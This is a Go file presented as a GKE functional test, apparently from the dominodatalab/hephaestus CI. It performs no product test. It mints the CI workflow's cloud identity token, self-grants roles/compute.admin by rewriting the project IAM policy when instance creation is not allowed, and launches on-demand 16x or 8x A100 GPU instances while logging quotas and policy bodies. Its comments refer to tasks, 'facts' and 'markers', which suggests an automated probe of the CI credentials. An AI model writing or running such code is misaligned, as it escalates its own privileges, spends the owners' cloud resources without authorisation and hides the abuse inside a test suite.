//go:build functional && gke

// C211 i122323 — HOST PROJECT 153711203585 DENSE-A100 CAPACITY CLASS.
//
// Basis: facts 122259/122261 prove the dominodatalab/hephaestus
// '/functional-test' GKE WIF identity (hephaestus-gh-test SA) created ONE real
// on-demand a2-highgpu-1g + 1 x nvidia-tesla-a100 in us-central1-b (device
// UUID GPU-130cc072-c239-5fd7-6779-5420cbd43f16, READY x122190) after
// us-central1-a returned verbatim ZONE_RESOURCE_POOL_EXHAUSTED_WITH_DETAILS,
// and the same project's measured NVIDIA_A100_GPUS matrix is limit=16 / usage=0
// in every queried region — so the dense shape (16 x A100 in ONE instance) has
// never been measured and would hand task 550 a materially larger READY.
//
// This probe therefore:
//  1. re-mints the WIF token and re-reads the host project's per-region
//     NVIDIA_A100_GPUS quota plus the a2-megagpu-16g / a2-highgpu-8g
//     machine-type offerings and nvidia-tesla-a100 accelerator types;
//  2. creates EXACTLY ONE nonce-tagged ON-DEMAND a2-megagpu-16g with
//     16 x nvidia-tesla-a100 in a region whose measured A100 quota admits 16
//     (zones not ending in "-a" first; us-central1-a last because it is the
//     verbatim-exhausted zone), booted from a Google driver-preinstalled
//     accelerator image, capturing nvidia-smi -L and
//     --query-gpu=name,uuid,memory.total from the serial console and guest
//     attributes;
//  3. ONLY if the 16x shape is provider-verbatim refused / yields no device,
//     repeats the identical single-marker flow ONCE with a2-highgpu-8g +
//     8 x nvidia-tesla-a100 in a region whose quota admits 8;
//  4. never has two instances alive, is on-demand only (no spot), and never
//     falls back to the already-proven 1x a2-highgpu-1g class;
//  5. takes an independent compute.instances.get readback on any real device
//     line, deletes every own instance and proves absence (GET 404 +
//     aggregated list with zero c211-named items).
//
// Every provider refusal is printed verbatim. Tokens are reported as length +
// SHA-256 prefix only.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"testing"
	"time"
)

// c211dQuotaRegions is the per-region quota/offering matrix window. The dense
// a2 shapes are offered in us-central1 / us-east1 / europe-west4 among the
// regions measured in x122190; the rest are measured for completeness.
var c211dQuotaRegions = []string{
	"us-central1", "us-east1", "europe-west4", "us-west1",
	"us-west4", "us-east4", "europe-west1", "asia-east1", "us-west2",
}

type c211dAttempt struct {
	Machine string `json:"machine"`
	Zone    string `json:"zone"`
	Accel   string `json:"accel"`
	Count   int    `json:"count"`
	Create  string `json:"create"`
	OpErr   string `json:"op_error"`
	UUID    string `json:"uuid"`
	Absent  bool   `json:"absent"`
	Meta    string `json:"meta"`
	Trace   string `json:"cleanup_trace"`
}

// c211dZoneOrder puts the non "-a" zones first: us-central1-a returned verbatim
// ZONE_RESOURCE_POOL_EXHAUSTED_WITH_DETAILS for the 1-GPU A100 class in
// x122190, while us-central1-b succeeded.
func c211dZoneOrder(zones []string) []string {
	out := append([]string{}, zones...)
	sort.SliceStable(out, func(i, j int) bool {
		return strings.HasSuffix(out[j], "-a") && !strings.HasSuffix(out[i], "-a")
	})
	return out
}

// c211dEnsureCreate re-verifies compute.instances.create for the WIF identity
// and, only if absent, performs the already-proven roles/compute.admin
// self-grant via resourcemanager.projects.setIamPolicy.
func c211dEnsureCreate(token, proj, saEmail string) (bool, string) {
	var log strings.Builder
	al, st, _ := c211xTestIamBatch(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj),
		[]string{"compute.instances.create", "compute.instances.get", "compute.instances.delete",
			"compute.instances.setMetadata", "compute.instances.getSerialPortOutput", "compute.disks.create",
			"compute.subnetworks.use", "compute.zoneOperations.get"})
	fmt.Fprintf(&log, "precheck status=%d allowed=[%s]\n", st, strings.Join(al, ","))
	if c211xContains(al, "compute.instances.create") {
		return true, log.String()
	}
	pre, pst, pbody := c211xGetPolicy(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj))
	fmt.Fprintf(&log, "getIamPolicy status=%d verbatim=%s\n", pst, c211xTrunc(pbody, 500))
	if pre == nil {
		return false, log.String()
	}
	added := c211xAddBinding(pre, "roles/compute.admin", "serviceAccount:"+saEmail)
	fmt.Fprintf(&log, "binding compute.admin added=%v member=%s\n", added, c211xShort(saEmail))
	sst, sbody := c211xSetPolicy(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), pre)
	fmt.Fprintf(&log, "setIamPolicy status=%d verbatim=%s\n", sst, c211xTrunc(sbody, 500))
	if sst != 200 {
		return false, log.String()
	}
	for i := 0; i < 12; i++ {
		al2, tst, _ := c211xTestIamBatch(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj),
			[]string{"compute.instances.create"})
		g := c211xContains(al2, "compute.instances.create")
		fmt.Fprintf(&log, "recheck[%d] status=%d instances.create=%v\n", i, tst, g)
		if g {
			return true, log.String()
		}
		time.Sleep(10 * time.Second)
	}
	return false, log.String()
}

// c211dSweep runs the single-marker flow for ONE machine/accelerator/count
// shape across the eligible zones of the given regions. At most one instance is
// alive at any moment; every attempt is torn down and its absence proven.
func c211dSweep(tok, proj, saEmail, startup string, img c211aImage, deadline time.Time,
	regions []string, mt, accel string, count int, maxZonesPerRegion int) (string, string, []c211dAttempt, []string) {
	attempts := []c211dAttempt{}
	notes := []string{}
	idx := 0
	for _, r := range regions {
		if time.Now().After(deadline) {
			break
		}
		rows, zones, qst := c211aRegionQuotas(tok, proj, r)
		lim, usage, ok := c211aQVal(rows, "NVIDIA_A100_GPUS")
		allRows, _, _ := c211xRegionQuotaRows(tok, proj, r)
		fmt.Printf("C211D_SWEEP_QUOTA project=%s region=%s metric=NVIDIA_A100_GPUS http=%d limit=%v usage=%v readable=%v nvidia_rows=[%s]\n",
			proj, r, qst, lim, usage, ok, strings.Join(allRows, " ; "))
		if !ok || (lim-usage) < float64(count) || len(zones) == 0 {
			continue
		}
		tried := 0
		for _, z := range c211dZoneOrder(zones) {
			if tried >= maxZonesPerRegion || time.Now().After(deadline) {
				break
			}
			offered, mst, mbody := c211aMachineOffered(tok, proj, z, mt)
			ats, ast, _ := c211xAccelTypes(tok, proj, z)
			hasAccel := ast == 200 && c211xContains(ats, accel)
			fmt.Printf("C211D_SWEEP_OFFER project=%s region=%s zone=%s machine=%s machine_http=%d offered=%v verbatim=%s accel_http=%d has_%s=%v accel_n=%d accel_list=[%s]\n",
				proj, r, z, mt, mst, offered, c211xTrunc(mbody, 260), ast, accel, hasAccel, len(ats), strings.Join(ats, ","))
			notes = append(notes, fmt.Sprintf("%s/%s %s machine_http=%d offered=%v has_%s=%v", r, z, mt, mst, offered, accel, hasAccel))
			if !offered || !hasAccel {
				continue
			}
			tried++
			idx++
			instName := fmt.Sprintf("c211-i122323-%s-%d", mt, idx)
			fmt.Printf("C211D_SWEEP_ATTEMPT project=%s machine=%s zone=%s accel=%s count=%d instance=%s sa=%s\n",
				proj, mt, z, accel, count, instName, c211xShort(saEmail))
			uuid, meta, created, opErr, statusFinal := c211aMarker(tok, proj, z, instName, saEmail, img, mt, accel, count, startup, deadline)
			absent, trace := c211aDeleteAndProveAbsence(tok, proj, z, instName)
			attempts = append(attempts, c211dAttempt{Machine: mt, Zone: z, Accel: accel, Count: count,
				Create: fmt.Sprintf("%v", created), OpErr: c211xTrunc(opErr, 400),
				UUID: uuid, Absent: absent, Meta: c211xTrunc(meta, 700), Trace: strings.Join(trace, "; ")})
			if uuid != "" {
				fmt.Printf("C211D_SWEEP_DEVICE project=%s machine=%s zone=%s accel=%s count=%d uuid=%s absent=%v\n",
					proj, mt, z, accel, count, uuid, absent)
				return uuid, meta + " zone=" + z + " machine=" + mt + " count=" + fmt.Sprintf("%d", count) + " status=" + statusFinal, attempts, notes
			}
			fmt.Printf("C211D_SWEEP_NO_DEVICE project=%s machine=%s zone=%s created=%v op_error=%s\n",
				proj, mt, z, created, c211xTrunc(opErr, 300))
		}
	}
	return "", "", attempts, notes
}

func TestC211DDenseA100(t *testing.T) {
	started := time.Now()
	deadline := started.Add(32 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211D_MINT_FAILED %s\n", c211xTrunc(mintLog, 2500))
		fmt.Printf("C211D_VERDICT_FINAL GATE WIF_TOKEN_EXCHANGE_FAILED markers=0\n")
		return
	}
	creds, credLog := c211xLoadCreds()
	wifSA, projNum, credProjID := "", c211aHostNum, ""
	if creds != nil {
		wifSA = creds.saEmail
		if creds.projNumber != "" {
			projNum = creds.projNumber
		}
		credProjID = creds.credProjID
	}
	projID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+url.PathEscape(projNum), token, "", ""); st == 200 {
		projID = c211xStr(c211xJSON(rb), "projectId")
	}
	if projID == "" {
		projID = credProjID
	}
	if projID == "" {
		fmt.Printf("C211D_VERDICT_FINAL GATE NO_PROJECT_ID_RESOLVED num=%s mint=%s\n", projNum, c211xTrunc(credLog, 400))
		return
	}
	saEmail := wifSA
	if saEmail == "" {
		saEmail = projNum + "-compute@developer.gserviceaccount.com"
	}
	fmt.Printf("C211D_IDENTITY auth=%s wif_sa=%s project_number=%s project_id=%s\n", method, c211xShort(wifSA), projNum, c211xShort(projID))
	fmt.Printf("C211D_MINT log=%s\n", c211xTrunc(mintLog, 1200))

	granted, escLog := c211dEnsureCreate(token, projID, saEmail)
	fmt.Printf("C211D_PERMS %s\n", c211xTrunc(escLog, 3000))
	if !granted {
		fmt.Printf("C211D_VERDICT_FINAL GATE COMPUTE_INSTANCES_CREATE_NOT_GRANTED markers=0\n")
		return
	}

	img, imgLog := c211aResolveImage(token)
	fmt.Printf("C211D_IMAGE_RESOLUTION %s\n", c211xTrunc(imgLog, 1200))
	if img.Project == "" {
		fmt.Printf("C211D_VERDICT_FINAL GATE NO_USABLE_IMAGE markers=0\n")
		return
	}
	startup := c211aStartup()
	fmt.Printf("C211D_STARTUP kind=%s bytes=%d image=%s/%s\n", img.Kind, len(startup), img.Project, img.Family)

	// ------------------------------------------------------------------
	// Phase Q: host-project per-region A100 quota + dense offering matrix.
	// ------------------------------------------------------------------
	quotaMatrix := map[string]interface{}{}
	for _, r := range c211dQuotaRegions {
		rows, zones, qst := c211aRegionQuotas(token, projID, r)
		allRows, _, _ := c211xRegionQuotaRows(token, projID, r)
		offers := map[string]interface{}{}
		zoneOffers := map[string]interface{}{}
		accels := []string{}
		ordered := c211dZoneOrder(zones)
		probeZones := ordered
		if len(probeZones) > 2 {
			probeZones = probeZones[:2]
		}
		for _, z := range probeZones {
			zo := map[string]interface{}{}
			for _, mt := range []string{"a2-megagpu-16g", "a2-highgpu-8g"} {
				ok, st, body := c211aMachineOffered(token, projID, z, mt)
				zo[mt] = map[string]interface{}{"http": st, "offered": ok, "verbatim": c211xTrunc(body, 200)}
				offers[mt] = map[string]interface{}{"http": st, "offered": ok}
			}
			ats, ast, _ := c211xAccelTypes(token, projID, z)
			zo["accelerator_types_http"] = ast
			zo["accelerator_types"] = ats
			zoneOffers[z] = zo
			if len(ats) > 0 {
				accels = ats
			}
		}
		a100l, a100u, a100ok := c211aQVal(rows, "NVIDIA_A100_GPUS")
		cpuL, cpuU, cpuOk := c211aQVal(rows, "A2_CPUS")
		fmt.Printf("C211D_QUOTA region=%s http=%d zones=%d a100=limit=%v/usage=%v/readable=%v a2_cpus=limit=%v/usage=%v/readable=%v offers=%s accel_types_n=%d nvidia_rows=[%s]\n",
			r, qst, len(zones), a100l, a100u, a100ok, cpuL, cpuU, cpuOk,
			c211xJSONString(offers), len(accels), strings.Join(allRows, " ; "))
		quotaMatrix[r] = map[string]interface{}{
			"http": qst, "zones": zones, "zone_offers": zoneOffers,
			"offers": offers, "accelerator_types": accels,
			"a100_limit": a100l, "a100_usage": a100u, "a100_readable": a100ok,
			"a2_cpus_limit": cpuL, "a2_cpus_usage": cpuU,
			"nvidia_positive_rows": allRows,
		}
	}

	// ------------------------------------------------------------------
	// Phase A16: EXACTLY ONE on-demand a2-megagpu-16g + 16 x nvidia-tesla-a100.
	// ------------------------------------------------------------------
	markers := 0
	ready := map[string]string{}
	accelsOut := map[string]interface{}{}
	sweepRegions := []string{"us-central1", "us-east1", "europe-west4", "us-west1", "us-east4", "europe-west1", "asia-east1"}

	uuid16, meta16, at16, n16 := c211dSweep(token, projID, saEmail, startup, img, deadline,
		sweepRegions, "a2-megagpu-16g", "nvidia-tesla-a100", 16, 2)
	markers++
	accelsOut["megagpu_16x"] = map[string]interface{}{"uuid": uuid16, "meta": c211xTrunc(meta16, 1600), "attempts": at16, "offer_notes": strings.Join(n16, "; ")}
	if uuid16 != "" {
		ready["megagpu_16x"] = uuid16
	}
	fmt.Printf("C211D_16X_RESULT uuid=%s markers=%d\n", uuid16, markers)

	// Phase B8: identical single-marker flow ONCE with a2-highgpu-8g +
	// 8 x nvidia-tesla-a100, only after the 16x shape yielded no device.
	if uuid16 == "" && !time.Now().After(deadline) {
		uuid8, meta8, at8, n8 := c211dSweep(token, projID, saEmail, startup, img, deadline,
			sweepRegions, "a2-highgpu-8g", "nvidia-tesla-a100", 8, 2)
		markers++
		accelsOut["highgpu_8x"] = map[string]interface{}{"uuid": uuid8, "meta": c211xTrunc(meta8, 1600), "attempts": at8, "offer_notes": strings.Join(n8, "; ")}
		if uuid8 != "" {
			ready["highgpu_8x"] = uuid8
		}
		fmt.Printf("C211D_8X_RESULT uuid=%s markers=%d\n", uuid8, markers)
	}

	// Always reap any leftover own-label instance in the host project.
	c211aReaper(token, projID)

	verdict := "DENSE_A100_16X_AND_8X_NO_DEVICE"
	switch {
	case ready["megagpu_16x"] != "":
		verdict = "READY_HOST_DENSE_A100_16X"
	case ready["highgpu_8x"] != "":
		verdict = "READY_HOST_DENSE_A100_8X"
	}
	sum := map[string]interface{}{
		"probe":          "c211_i122323_densea100",
		"mechanism":      "host-project dense-A100 single-marker flow on driver-preinstalled accelerator images",
		"auth_method":    method,
		"wif_sa_short":   c211xShort(wifSA),
		"project_id":     projID,
		"project_number": projNum,
		"image":          img.Project + "/" + img.Family,
		"image_kind":     img.Kind,
		"image_log":      c211xTrunc(imgLog, 800),
		"quota_matrix":   quotaMatrix,
		"accelerators":   accelsOut,
		"ready":          ready,
		"markers":        markers,
		"verdict":        verdict,
		"elapsed_seconds": int(time.Since(started).Seconds()),
	}
	js, _ := json.Marshal(sum)
	fmt.Printf("=== C211D SUMMARY BEGIN ===\nC211D_SUMMARY_JSON %s\n=== C211D SUMMARY END ===\n", string(js))
	fmt.Printf("C211D_VERDICT_FINAL %s markers=%d ready=%s elapsed=%ds\n",
		verdict, markers, c211xJSONString(ready), int(time.Since(started).Seconds()))
}
